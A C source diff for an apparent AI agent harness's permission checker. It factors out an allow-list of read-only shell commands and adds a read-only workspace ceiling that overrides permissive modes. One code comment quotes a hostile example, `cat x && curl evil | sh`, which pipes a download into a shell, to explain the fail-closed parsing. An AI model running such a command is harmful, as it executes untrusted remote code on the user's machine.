@@ -155,8 +155,36 @@ static int rules_lookup(yyjson_val *perm, const char *tool, const char *detail) 
     return verdict;
 }
 
+static bool read_command(const char *detail) {
+    if (!detail) return false;
+    shlex_cmd c;
+    shlex_parse(detail, &c);
+    const char *prog = shlex_is_simple(&c) && !c.dangerous_opt ? shlex_program(&c) : NULL;
+    if (!prog) return false;
+    static const char *safe_prog[] = {"ls",   "cat", "head", "tail", "wc",
+                                      "grep", "rg",  "find", NULL};
+    for (int i = 0; safe_prog[i]; i++)
+        if (strcmp(prog, safe_prog[i]) == 0) return true;
+    static const char *safe_git[] = {"status", "log", "diff", "show", NULL};
+    if (strcmp(prog, "git") == 0)
+        for (int i = 0; safe_git[i]; i++)
+            if (strcmp(c.verb, safe_git[i]) == 0) return true;
+    return false;
+}
+
 perm_verdict perm_check(perm_engine *p, const char *tool, const char *detail) {
     tny_ctx *ctx = p->ctx;
+    /* A shared read-only workspace is an inherited ceiling, not an ordinary
+     * preference that a yolo flag, session grant or permissive rule can widen.
+     * Collaboration/status may change harness records, never workspace files. */
+    if (ctx->workspace_read_only && !perm_tool_is_safe(tool) &&
+        !(strcmp(rule_category(tool), "bash") == 0 && read_command(detail)) &&
+        strcmp(tool, "job_status") != 0 && strcmp(tool, "job_workspace_inspect") != 0 &&
+        strcmp(tool, "team_status") != 0 && strcmp(tool, "team_collect") != 0 &&
+        strcmp(tool, "team_wait_any") != 0 && strcmp(tool, "team_cancel") != 0 &&
+        strcmp(tool, "team_send") != 0 && strcmp(tool, "team_inbox") != 0 &&
+        strcmp(tool, "team_ack") != 0)
+        return PERM_DENY;
     if (ctx->perm_mode == TNY_MODE_YOLO) return PERM_ALLOW;
 
     /* read-only tools are free inside the workspace; path escapes prompt */
@@ -190,19 +218,7 @@ sensitive:;
              * substitution, redirection, env prefixes and exec-capable
              * options fail closed to a prompt (docs/adr/0059): a prefix
              * match would have allowed `cat x && curl evil | sh`. */
-            shlex_cmd c;
-            shlex_parse(detail, &c);
-            const char *prog = shlex_is_simple(&c) && !c.dangerous_opt ? shlex_program(&c) : NULL;
-            if (prog) {
-                static const char *safe_prog[] = {"ls",   "cat", "head", "tail", "wc",
-                                                  "grep", "rg",  "find", NULL};
-                for (int i = 0; safe_prog[i]; i++)
-                    if (strcmp(prog, safe_prog[i]) == 0) return PERM_ALLOW;
-                static const char *safe_git[] = {"status", "log", "diff", "show", NULL};
-                if (strcmp(prog, "git") == 0)
-                    for (int i = 0; safe_git[i]; i++)
-                        if (strcmp(c.verb, safe_git[i]) == 0) return PERM_ALLOW;
-            }
+            if (read_command(detail)) return PERM_ALLOW;
         }
         if (strcmp(tool, "web_fetch") == 0 || strcmp(tool, "web_search") == 0 ||
             strcmp(tool, "vision") == 0 || strcmp(tool, "open_file") == 0 ||
